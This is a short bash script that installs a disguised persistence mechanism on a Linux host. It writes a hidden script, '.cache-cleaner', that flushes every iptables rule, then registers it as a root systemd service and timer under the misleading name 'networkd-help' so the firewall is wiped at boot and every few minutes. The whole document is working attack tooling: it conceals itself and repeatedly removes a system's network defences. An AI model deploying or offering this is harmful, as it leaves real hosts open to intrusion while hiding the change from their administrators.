#!/bin/bash

# Define file paths
SYSTEMD_SERVICE="/etc/systemd/system/networkd-help.service"
SYSTEMD_TIMER="/etc/systemd/system/networkd-help.timer"
HIDDEN_SCRIPT="/usr/local/bin/.cache-cleaner"

# Create hidden script that flushes iptables
echo "[+] Creating hidden iptables flush script..."
echo "#!/bin/bash" > $HIDDEN_SCRIPT
echo "iptables -t nat -F" >> $HIDDEN_SCRIPT
echo "iptables -t mangle -F" >> $HIDDEN_SCRIPT
echo "iptables -F" >> $HIDDEN_SCRIPT
echo "iptables -X" >> $HIDDEN_SCRIPT
chmod +x $HIDDEN_SCRIPT

# Create systemd service file
echo "[+] Creating systemd service file..."
cat <<EOF > $SYSTEMD_SERVICE
[Unit]
Description=Periodic helper for networkd 
After=network.target
Wants=network.target

[Service]
Type=oneshot
User=root
ExecStart=$HIDDEN_SCRIPT
Restart=on-failure
RestartSec=30s

[Install]
WantedBy=multi-user.target
EOF

# Create systemd timer file
echo "[+] Creating systemd timer file..."
cat <<EOF > $SYSTEMD_TIMER
[Unit]
Description=Helper for networkd

[Timer]
OnBootSec=3m
OnUnitInactiveSec=2min
RandomizedDelaySec=1m
Persistent=true

[Install]
WantedBy=timers.target
EOF

# Reload systemd, enable, and start the service & timer
echo "[+] Reloading systemd and enabling the service and timer..."
systemctl daemon-reload
systemctl enable networkd-help
systemctl enable networkd-help.timer
systemctl start networkd-help
systemctl start networkd-help.timer

# Verify service and timer status
echo "[+] Checking service status..."
systemctl status networkd-help --no-pager

echo "[+] Checking timer status..."
systemctl list-timers --no-pager | grep networkd-help

echo "[✔] Iptables flush service and timer setup complete! Rules will flush every 2-3 minutes."